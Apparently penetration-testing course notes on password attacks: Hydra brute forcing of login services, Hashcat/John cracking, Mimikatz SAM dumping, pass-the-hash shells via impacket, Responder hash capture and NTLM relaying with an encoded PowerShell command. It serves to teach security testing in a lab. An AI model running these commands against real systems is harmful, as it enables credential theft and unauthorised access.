---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 15: Password Attacks

## Attacking Network Services Logins

### SSH and RDP

Brute force SSH with **known username** and **unknown password** on abnormal port number (-t 4 due to SSH commonly limiting parallel tasks to 4):\
`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 ssh://192.168.50.201`

Brute force RDP with **unknown username** and **known password**:\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`

Brute force FTP with **unknown username** and **unknown password:**\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.50.203`

### HTTP POST Login Form

Brute force HTTP POST login form with **unknown username** and **unknown password**:\
`hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"`\
This targets a webpage hosting a login form at /index.php, followed by a colon, then the post-form fields found via burpsuite, followed by an additional colon, followed finally by the invalid login text displayed to help hydra understand failures vs. successes.

Brute force HTTP GET login form with **known username** and **unknown password**:\
`hydra -l admin -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-get "/"`

## Password Cracking Fundamentals

### Introduction to Encryption, Hashes and Cracking

John the Ripper is more a CPU-based crackin tool, which also supports GPUs.

* JtR can be run without additinoal drivers using only CPUs for cracking.

Hashcat is mainly a GPU-based cracking tool that also support CUPs.

* Hashcat requires _OpenCL_ or _CUDA_ for the GPU cracking process.

For most algorithms, a GPU is faster than a CPU. However, some slow hashing algorithms (like _bcrypt_) work better on CPUs.

Cracking _time_ can be calculated by dividing the _keyspace_ with the hash rate.\
The keyspace is the character set to teh power of the amount of characters/length of the original information. For example lower-case Latin alphabet (26 chars), upper-case Latin alphabet (26 chars), and 0-9 (10 chars) will result in 62 total characters.

A five-character long password would result in the keyspace being 62^5, i.e. 916,132,832 unique variations.

### Mutating Wordlists

The [_Hashcat Wiki_](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack) provides a list of all possible rule functions with examples.\
For the example here, we'll append a 1 to every password:

```bash
kali@kali:~$ cat demo.txt
password
iloveyou
princess
rockyou
abc123

kali@kali:~$ echo \$1 > demo.rule
kali@kali:~$ hashcat -r demo.rule --stdout demo.txt
password1
iloveyou1
princess1
rockyou1
abc1231

```

Now, let's capitalize every password by including the `c` rule function, next putting the rule functions on separate lines to make two mutated passwords:

```bash
kali@kali:~$ cat demo1.rule
$1 c

kali@kali:~$ hashcat -r demo1.rule --stdout demo.txt
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231

kali@kali:~$ cat demo2.rule
$1
c

kali@kali:~$ hashcat -r demo2.rule --stdout demo.txt
password1
Password
iloveyou1
Iloveyou
princess1
Princess
rockyou1
Rockyou
abc1231
Abc123
```

Finally, let's add an exclamation mark before the one, and capitalizing the password:

```bash
kali@kali:~$ cat demo1.rule
$1 c $!

kali@kali:~$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```

Using hashcat along with a demo rule to crack a MD5 hash:\
`hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule`

Premade hashcat rules can be found at:\
`/usr/share/hashcat/rules/`

### Cracking Methodology

Steps to crack hashes:

1. Extract hashes
   * Find the hash
2. Format hashes
   * Utilize tools like `hashid` or `hash-identifier` to identify the hash you've found.
3. Calculate the cracking time
   * Is it feasible to try and crack the hash? Weigh against the time available on the assessment.
4. Prepare wordlist
   * Investigate password policies, check out password leaks for samples.
5. Attack the hash
   * **Ensure** there are no additional characters, i.e. spaces, newlines, etc. copied into the hash as any additional information will affect it.

### Password Manager

Example scenario: RDP'd onto a device with KeePass installed.

```powershell
// First, let's find any/all KeePass database files.
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Transfer the **.kdbx** file to our kali box then we can use scripts like `keepass2john` to format the database password into a crackable hash for **john/hashcat**.\
`keepass2john Database.kdbx > keepass.hash`

Since KeePass uses a master password without any kind of username, we need to remove the **Database** string prepended to the hash along with the colon separating it from the hash itself.&#x20;

Finding a hash type in hashcat without resorting to searching the Wiki/internet:\
`hashcat --help | grep -i "KeePass"`

### SSH Private Key Passphrase

Transform the id\_rsa to a format for **john/hashcat**:\
`ssh2john id_rsa > ssh.hash`\
Similar to the keepass database password hash, remove the filename from the hash.

Finding a hash type in hashcat without resorting to searching the Wiki/internet:\
`hashcat --help | grep -i "ssh"`

Using a hashcat rule file for **john** requires adding a name for the rule and appending them to **/etc/john/john.conf**. In this case, we'll name the rule **sshRules**. Finally, we'll use this rule with **john** to crack the password:

<pre class="language-bash"><code class="lang-bash"><strong>kali@kali:~$ cat ssh.rule
</strong>[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~$ sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
kali@kali:~$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
</code></pre>

## Working with Password Hashes

### Cracking NTLM

Windows stores hashed user passwords in the _Security Account Manager (SAM)_ database file. Modern systems store passwords as NTLM hashes. Older systems may be storing them in _LAN Manager (LM)_ form which is very weak. LM is disabled by default beginning with Vista and Server 2008.

NTLM hash === NTHash.

Because the kernel has a lock on the SAM database while the system is running, we use tools like _Mimikatz_ to bypass this restriction. It can extract plain-text passwords and hashes. It includes the _sekurlsa_ module, which extracts password hashes from the _Local Security Authority Subsystem (LSASS)_ process memory. LSASS handles user authentication, password changes, and _access token_ creation.

Mimikatz can only extract passwords if run as Administrator (or higher) with _SeDebugPrivilege_ access rights. Using the built-in _token elevation_ function of Mimikatz requires the _SeImpersonatePrivilege_ access rights -- all local administrators have this access right.

Using Mimikatz:

```powershell
PS C:\tools\> .\mimikatz.exe

// <Fancy ASCII art here>

// Enable SeDebugPrivilege
mimikatz # privilege::debug
Privilege '20' OK

// Elevate to SYSTEM privileges
mimikatz # token::elevate
...
-> Impersonated !
...

// Extract the NTLM hashes from the SAM.
mimikatz # lsadump::sam
...
User : nelly
  Hash NTLM: 3ae8e...
```

### Passing NTLM

Pass-the-Hash (PtH) requires the remote computer to have an account with the same username and password. Since Vista, all Windows versions have _UAC remote restrictions_ enabled by default, meaning pass-the-hash will likely only work for the local _Administrator_ account.

To leverage pass-the-hash, you must use a tool that supports authentication with NTLM hashes. Some examples include:

SMB Enumeration/Management

* smbclient
* CrackMapExec

Command Execution

* impacket library tools
  * psexec.py
  * wmiexec.py

Using **smbclient** to PtH:\
`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash <hash_here>`

Using **psexec.py** for PtH and get an interactive shell as SYSTEM. In the hash section, since we only use the NTLM hash, the LMHash can be replace with 32 zeroes. A command can be entered at the end, otherwise leaving it blank will default to **cmd.exe**:

```bash
kali@kali:~$ impacket-psexec -hashes <LMHash:NTHash>  Administrator@192.168.50.212

C:\Windows\system32> whoami
nt authority\system
```

Using **wmiexec.py** for the same reason as **psexec.py** will result in an interactive shell as the user:

<pre class="language-bash"><code class="lang-bash"><strong>kali@kali:~$ impacket-wmiexec-hashes &#x3C;LMHash:NTHash>  Administrator@192.168.50.212
</strong>
C:\> whoami
files02\administrator
</code></pre>

### Cracking Net-NTLMv2

_Net-NTLMv2 === NTLMv2_\
NTLMv2 < Kerberos in terms of security.

_**Responder**_ is great for beginning our abuse of NTLMv2's weaknesses.\
If we have Responder listening on our device, we can initiate the authentication via an exploited device (without admin perms) simply by running `ls \\our.listening.ip.here\share` via PowerShell.

Setting up Responder

```bash
// On Kali
kali@kali:~$ ip -br a sh
tun0        UNKNOWN        192.168.119.2/24 <ipv6>/64
kali@kali:~$ sudo responder -I tun0

// On compromised device as a non-admin
C:\Windows\System32> dir \\192.168.119.2\test
```

At this point, Responder should have captured the user's NTLMv2-SSP Hash which we can save to a file for cracking. Hashcat uses mode 5600 for NetNTLMv2.

### Relaying Net-NTLMv2

Similar to sending the NetNTLMv2 SMB communication to Responder, in this case we'll be forwarding along the hash to another device (we're assuming the time taken to crack the hash isn't feasible). To do so, we'll use the tool _**impacket-ntlmrelayx**_.

Example use-case, we'll be disabling the HTTP server, adding support for SMB2, and targeting 192.168.50.212. Lastly, we'll set our command. **Remember to UTF-16LE encode the powershell before base64ing it**:\
`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
